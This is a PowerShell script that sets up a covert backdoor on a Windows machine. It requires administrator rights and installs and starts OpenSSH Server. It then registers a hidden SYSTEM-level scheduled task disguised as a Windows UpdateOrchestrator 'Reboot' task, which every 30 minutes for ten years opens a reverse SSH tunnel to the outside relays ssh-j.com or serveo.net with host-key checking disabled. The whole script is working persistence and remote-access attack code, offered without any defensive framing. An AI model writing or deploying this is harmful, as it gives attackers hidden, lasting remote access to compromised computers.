[CmdletBinding()]
param (
    # [Parameter(Mandatory=$true)]
    [string]$Name, 
    [int]$ReconnectInterval,
    [string]$providor,
    [switch]$V,
    [int]$intervalMinutes = 30,
    [switch]$force 

)

function Install-SSH {
    try {
        # Install OpenSSH Client if not installed
        if (-not (Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Client*' -and $_.State -eq 'Installed' })) {
            Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
            Write-Host "OpenSSH Client installed."
        } else {
            if ($V) { Write-Host "OpenSSH Client already installed." }
        }

        # Install OpenSSH Server if not installed
        if (-not (Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Server*' -and $_.State -eq 'Installed' })) {
            Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
            Write-Host "OpenSSH Server installed."
        } else {
            if ($V) { Write-Host "OpenSSH Server already installed." }
        }

        # Configure and start the SSH service
        Set-Service -Name sshd -StartupType Automatic
        Start-Service sshd
        Write-Host "OpenSSH Server service started and set to automatic."
    }
    catch {
        Write-Error "Failed to install/start OpenSSH: $_"
        Exit 1
    }
}

function SetupPersistence {
    param (
        [Parameter(Mandatory=$true)]
        [string]$alias,
        [string]$username = "zu",
        [string]$TaskPath = "Microsoft\Windows\UpdateOrchestrator\",
        [string]$TaskName = "Reboot"
    )

    # delete the task to create a new one 
    if ($force) {Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false}

    if (Get-ScheduledTask -TaskName 'Reboot' -ErrorAction SilentlyContinue){
        Write-Host "Task already exist!"
        Exit 1 
    }

    Try {
        if ($providor -eq "ssh-j"){
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"Start-Process 'ssh.exe' -ArgumentList '-o StrictHostKeyChecking=no', '-o ExitOnForwardFailure=yes', '$($username)@ssh-j.com', '-R $($alias):22:localhost:22', '-N', '-f' -WindowStyle Hidden`""
        }else {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"Start-Process 'ssh.exe' -ArgumentList '-o StrictHostKeyChecking=no', '-o ExitOnForwardFailure=yes', '-R $($alias):22:localhost:22', 'serveo.net', '-N', '-f' -WindowStyle Hidden`""
        }
        
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes($intervalMinutes) -RepetitionInterval (New-TimeSpan -Minutes $intervalMinutes) -RepetitionDuration (New-TimeSpan -Days 3650)
        
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        Register-ScheduledTask -TaskName "$($TaskPath)$($TaskName)" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
        
        if ($V) {Write-Host "ssh -J $username@$providor.com $alias"}
    } Catch {
        Write-Error "Failed to setup persistence: $_"
    }
}


function Main {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Error "Run as Administrator."
        Exit 1
    }

    # Install-SSH
    SetupPersistence -alias 'nmuportal' -username 'zu' 
}

Main